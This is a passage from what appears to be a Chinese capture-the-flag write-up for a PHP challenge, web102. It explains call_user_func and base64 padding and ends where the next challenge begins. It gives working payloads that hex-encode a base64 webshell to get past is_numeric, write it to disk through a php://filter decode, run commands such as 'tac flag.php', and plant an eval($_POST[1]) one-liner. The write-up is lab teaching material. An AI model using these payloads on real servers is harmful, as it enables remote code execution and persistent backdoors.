&lt;h1 id=&#34;web102&#34;&gt;&lt;a href=&#34;#web102&#34; class=&#34;headerlink&#34; title=&#34;web102&#34;&gt;&lt;/a&gt;web102&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 20:59:43

*/


highlight_file(__FILE__);
$v1 = $_POST[&amp;#39;v1&amp;#39;];
$v2 = $_GET[&amp;#39;v2&amp;#39;];
$v3 = $_GET[&amp;#39;v3&amp;#39;];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4)&amp;#123;
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
&amp;#125;
else&amp;#123;
    die(&amp;#39;hacker&amp;#39;);
&amp;#125;


?&amp;gt;

Notice: Undefined index: v1 in /var/www/html/index.php on line 14

Notice: Undefined index: v2 in /var/www/html/index.php on line 15

Notice: Undefined index: v3 in /var/www/html/index.php on line 16
hacker
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;call_user_func()&lt;/code&gt; 是 PHP 中的一个非常强大且常用的函数，它的作用是：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;调用回调函数&lt;/strong&gt;，无论该函数是普通函数、类的方法，还是匿名函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;基本语法：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$callback&lt;/code&gt;：要调用的函数，可以是字符串、数组或匿名函数。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$parameter&lt;/code&gt;：要传递给回调函数的参数，可以有多个。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;使用场景：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;延迟函数调用（比如动态确定调用哪个函数）&lt;/li&gt;
&lt;li&gt;动态调用类的方法（类似反射）&lt;/li&gt;
&lt;li&gt;作为回调机制（比如自定义 hook、插件系统）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;常见用法举例&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1️⃣ 调用普通函数&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;function say_hello($name) &amp;#123;
    return &amp;quot;Hello, $name!&amp;quot;;
&amp;#125;

echo call_user_func(&amp;#39;say_hello&amp;#39;, &amp;#39;Tom&amp;#39;);
// 输出: Hello, Tom!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2️⃣ 调用类的静态方法&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;class A &amp;#123;
    public static function greet($msg) &amp;#123;
        return &amp;quot;Greeting: $msg&amp;quot;;
    &amp;#125;
&amp;#125;

echo call_user_func([&amp;#39;A&amp;#39;, &amp;#39;greet&amp;#39;], &amp;#39;Welcome&amp;#39;);
// 输出: Greeting: Welcome
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3️⃣ 调用对象的方法&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;class B &amp;#123;
    public function hi($name) &amp;#123;
        return &amp;quot;Hi, $name!&amp;quot;;
    &amp;#125;
&amp;#125;

$obj = new B();
echo call_user_func([$obj, &amp;#39;hi&amp;#39;], &amp;#39;Jumper&amp;#39;);
// 输出: Hi, Jumper!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4️⃣ 调用匿名函数&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$func = function($x, $y) &amp;#123;
    return $x + $y;
&amp;#125;;

echo call_user_func($func, 5, 7);
// 输出: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;🔁 动态调用函数 vs 普通调用区别&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;普通调用：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;my_function($a, $b);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;动态调用：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;call_user_func(&amp;#39;my_function&amp;#39;, $a, $b);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;适合在不知道调用哪个函数的情况下（如函数名是变量），或作为某种插件系统的基础。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将 &lt;code&gt;&amp;lt;?= `tac `*;&lt;/code&gt; base64编码后，去掉 &lt;code&gt;=&lt;/code&gt; ，再转成16进制形式&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;去掉 &lt;code&gt;=&lt;/code&gt; 的原因&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$b = base64_encode(&amp;#39;&amp;lt;?=`tac *`;?&amp;gt;&amp;#39;);   // 原始结果：PD89YHRhYyAqYDs=
echo bin2hex($b);                     // 结果含 &amp;#39;3d&amp;#39; -&amp;gt; 非纯数字
echo is_numeric(bin2hex($b));        // false

$b = str_replace(&amp;quot;=&amp;quot;, &amp;quot;&amp;quot;, $b);       // 变成 PD89YHRhYyAqYDs
echo bin2hex($b);                    // 全为数字：504438395948526859794171594473
echo is_numeric(bin2hex($b));        // true ✅
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;base64 的末尾 &lt;code&gt;=&lt;/code&gt; 是“填充符”，去掉不会影响 PHP 的 base64 解码结果（在特定条件下）&lt;/p&gt;
&lt;p&gt;原理：Base64 的填充机制（Padding）&lt;/p&gt;
&lt;p&gt;Base64 是把每 3 字节数据变成 4 个字符编码。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若原始数据长度不是 3 的倍数，就需要在结尾加 **填充符 &lt;code&gt;=&lt;/code&gt; 或 &lt;code&gt;==&lt;/code&gt;**。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;=&lt;/code&gt;：1 个字节缺失（2字节数据）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;==&lt;/code&gt;：2 个字节缺失（1字节数据）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;PHP 的 &lt;code&gt;base64_decode()&lt;/code&gt; 是容错的！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;即使 &lt;strong&gt;缺少 &lt;code&gt;=&lt;/code&gt; 结尾填充字符&lt;/strong&gt;，PHP 也能正常解码。&lt;/p&gt;
&lt;p&gt;✅ 示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
$b1 = &amp;quot;PD89YHRhYyAqYDs=&amp;quot;;  // 带等号
$b2 = &amp;quot;PD89YHRhYyAqYDs&amp;quot;;   // 去掉等号

echo base64_decode($b1);  // 输出: &amp;lt;?=`tac *`;
echo base64_decode($b2);  // 同样输出: &amp;lt;?=`tac *`;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;✔️ 两个结果完全相同！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
$a = base64_encode(&amp;#39;&amp;lt;?=`tac *`;&amp;#39;);  
$a = str_replace(&amp;quot;=&amp;quot;,&amp;quot;&amp;quot;,$a);
echo &amp;quot;base64加密后:&amp;quot;.$a.&amp;quot;\n&amp;quot;;
$b = call_user_func(&amp;#39;bin2hex&amp;#39;,$a); //即 $a=bin2hex($b);
echo &amp;quot;16进制形式:&amp;quot;.$b.&amp;quot;\n&amp;quot;;
var_dump(is_numeric($b));

/*运行结果
base64加密后:PD89YHRhYyAqYDs
16进制形式:504438395948526859794171594473
bool(true)
*/

或者

&amp;lt;?php
$a = base64_encode(&amp;#39;&amp;lt;?=`cat *`;&amp;#39;);
$a = str_replace(&amp;quot;=&amp;quot;,&amp;quot;&amp;quot;,$a);
echo &amp;quot;base64加密后:&amp;quot;.$a.&amp;quot;\n&amp;quot;;
$b = call_user_func(&amp;#39;bin2hex&amp;#39;,$a); //即 $a=bin2hex($b);
echo &amp;quot;16进制形式:&amp;quot;.$b.&amp;quot;\n&amp;quot;;
var_dump(is_numeric($b));

/*运行结果
base64加密后:PD89YGNhdCAqYDs
16进制形式:5044383959474e6864434171594473     含有 e ，被当做科学计数
bool(true)
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;php://filter/write=convert.base64-decode/resource=xxx&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;→ &lt;strong&gt;将写入的数据 base64 解码后写入文件 &lt;code&gt;xxx&lt;/code&gt; 中&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;此外，受 &lt;code&gt;substr($v2,2)&lt;/code&gt; 影响，需要在数字前面加上 &lt;code&gt;00&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?v2=00504438395948526859794171594473&amp;amp;v3=php://filter/write=convert.base64-decode/resource=1.php

#POST
v1=hex2bin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807104439621.png&#34; alt=&#34;image-20250807104439621&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/1.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807104403989.png&#34; alt=&#34;image-20250807104403989&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
$a = base64_encode(&amp;#39;&amp;lt;?= `  $_GET[a]`;&amp;#39;);
$a = str_replace(&amp;quot;=&amp;quot;,&amp;quot;&amp;quot;,$a);
echo &amp;quot;base64加密后:&amp;quot;.$a.&amp;quot;\n&amp;quot;;
$b = call_user_func(&amp;#39;bin2hex&amp;#39;,$a); //即 $a=bin2hex($b);
echo &amp;quot;16进制形式:&amp;quot;.$b.&amp;quot;\n&amp;quot;;
var_dump(is_numeric($b));

/*
运行结果
base64加密后:PD89IGAgICRfR0VUW2FdYDs
16进制形式:5044383949474167494352665230565557324664594473
bool(true)
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?v2=005044383949474167494352665230565557324664594473&amp;amp;v3=php://filter/write=convert.base64-decode/resource=1.php

#POST
v1=hex2bin
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807122952087.png&#34; alt=&#34;image-20250807122952087&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;靶机/1.php?a=ls

靶机/1.php?a=tac flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807123025326.png&#34; alt=&#34;image-20250807123025326&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807123116284.png&#34; alt=&#34;image-20250807123116284&#34; style=&#34;zoom: 33%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;或者写入一句话木马&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;靶机/1.php?a=echo -n &amp;quot;&amp;lt;?=eval($&amp;quot; &amp;gt;&amp;gt; 2.php

靶机/1.php?a=echo -n &amp;quot;_POST[1]);?&amp;gt;&amp;quot; &amp;gt;&amp;gt; 2.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;或者直接&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;靶机/1.php?a=echo -n &amp;quot;&amp;lt;?=eval($_POST[1]);?&amp;gt;&amp;quot; &amp;gt;&amp;gt; 2.php
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;echo&lt;/code&gt;：输出字符串&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;-n&lt;/code&gt;：不要自动输出换行符&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以这条命令的作用是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;把字符串 &lt;code&gt;&amp;lt;?=eval($&lt;/code&gt; &lt;strong&gt;原样输出到文件 &lt;code&gt;2.php&lt;/code&gt; 的末尾&lt;/strong&gt;，不带换行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807123908954.png&#34; alt=&#34;image-20250807123908954&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807124003845.png&#34; alt=&#34;image-20250807124003845&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web103&#34;&gt;&lt;a href=&#34;#web103&#34; class=&#34;headerlink&#34; title=&#34;web103&#34;&gt;&lt;/a&gt;web103&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
